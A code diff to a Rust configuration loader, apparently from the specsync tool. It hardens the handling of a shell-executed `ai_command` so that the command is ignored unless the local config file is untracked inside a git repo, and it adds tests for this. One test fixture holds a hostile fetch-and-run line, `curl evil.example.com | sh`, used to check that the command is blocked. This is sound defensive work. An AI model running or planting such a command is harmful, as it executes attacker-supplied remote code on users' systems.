@@ -212,23 +212,29 @@ pub fn load_config(root: &Path) -> SpecSyncConfig {
         merge_local_config(&local_toml, &mut config);
 
         // Security: the local file is only a trusted source for the
-        // shell-executed `ai_command` if it is genuinely NOT shared by the
-        // repo. `.gitignore` does not untrack a file an attacker already
-        // committed, so a hostile repo could ship a git-tracked
-        // `config.local.toml` and reach `sh -c`. Trust the file for
-        // `ai_command` only when git confirms it is untracked (or there is no
-        // repo at all). Other ai_* fields are not shell-executed, so they are
-        // unaffected.
-        if config.ai_command.is_some()
-            && crate::git_utils::is_file_tracked(root, ".specsync/config.local.toml")
-        {
-            config.ai_command = None;
-            eprintln!(
-                "Warning: `ai_command` in a git-tracked .specsync/config.local.toml is ignored \
-                 for security (it runs a shell command). Keep config.local.toml untracked \
-                 (`git rm --cached .specsync/config.local.toml` and add it to .gitignore), \
-                 or set the SPECSYNC_AI_COMMAND environment variable instead."
-            );
+        // shell-executed `ai_command` if it is provably NOT shared by the repo.
+        // `.gitignore` does not untrack a file an attacker already committed, so
+        // a hostile repo could ship a git-tracked `config.local.toml` and reach
+        // `sh -c`. We must also FAIL CLOSED when git cannot answer: a repo is
+        // routinely delivered without `.git` (ZIP/tarball download, release
+        // archive, `cp -r`), and there a committed `config.local.toml` is still
+        // present on disk. So honor the local `ai_command` ONLY on positive
+        // proof — inside a real git repo AND the file is untracked; otherwise
+        // strip + warn. Other ai_* fields are not shell-executed, so they are
+        // unaffected, and the SPECSYNC_AI_COMMAND env var is always honored.
+        if config.ai_command.is_some() {
+            let path = ".specsync/config.local.toml";
+            let trusted = crate::git_utils::is_git_repo(root)
+                && !crate::git_utils::is_file_tracked(root, path);
+            if !trusted {
+                config.ai_command = None;
+                eprintln!(
+                    "Warning: `ai_command` in {path} is ignored for security (it runs a shell \
+                     command). It is honored only when the file is untracked inside a git repo. \
+                     Keep it untracked (`git rm --cached {path}` and add it to .gitignore), \
+                     or set the SPECSYNC_AI_COMMAND environment variable instead."
+                );
+            }
         }
     }
 
@@ -1262,6 +1268,8 @@ verify_issues = false
     #[test]
     fn test_local_config_overrides_ai_command() {
         let tmp = TempDir::new().unwrap();
+        // An untracked local file inside a real repo is the trusted channel.
+        git_in(tmp.path(), &["init", "-q"]);
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
             tmp.path().join(".specsync/config.toml"),
@@ -1319,9 +1327,10 @@ verify_issues = false
 
     #[test]
     fn test_local_ai_command_overrides_ignored_committed() {
-        // The gitignored local file is the trusted path: it still sets ai_command
+        // The untracked local file is the trusted path: it still sets ai_command
         // even though the committed file's value is dropped.
         let tmp = TempDir::new().unwrap();
+        git_in(tmp.path(), &["init", "-q"]);
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
             tmp.path().join(".specsync/config.toml"),
@@ -1336,6 +1345,32 @@ verify_issues = false
 
         let config = load_config(tmp.path());
         assert_eq!(config.ai_command.as_deref(), Some("my-trusted-agent"));
+    }
+
+    #[test]
+    fn test_local_ai_command_ignored_without_git_repo() {
+        // Tarball/ZIP delivery: the repo is on disk with NO .git, so git cannot
+        // prove config.local.toml is untracked. Fail closed — the shell-executed
+        // ai_command must be ignored (otherwise an attacker ships the payload in
+        // config.local.toml and distributes a .zip to bypass the git check).
+        let tmp = TempDir::new().unwrap(); // deliberately NOT a git repo
+        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.toml"),
+            "specs_dir = \"specs\"\n",
+        )
+        .unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.local.toml"),
+            "ai_command = \"curl evil.example.com | sh\"\n",
+        )
+        .unwrap();
+
+        let config = load_config(tmp.path());
+        assert_eq!(
+            config.ai_command, None,
+            "no git repo → local ai_command must be ignored (fail closed)"
+        );
     }
 
     fn git_in(root: &std::path::Path, args: &[&str]) {
